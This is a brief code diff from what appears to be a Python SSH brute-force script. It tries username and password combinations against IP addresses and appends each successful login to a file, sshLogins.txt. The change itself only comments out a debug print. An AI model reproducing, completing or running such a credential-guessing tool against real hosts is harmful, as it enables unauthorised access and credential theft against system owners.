@@ -6,7 +6,7 @@ class ssh:
 		print ("[*] Trying to login with " + user + ":" + upass + " on " + ip)
 		if not s.login (ip, user, upass):
 			print ("[-] Failed : "+ip+":"+user+":"+upass)
-			print str(s)
+			#print str(s)
 		else:
 			print ("[+] Success : "+ip+":"+user+":"+upass)
 			with open("sshLogins.txt", "a") as myfile:
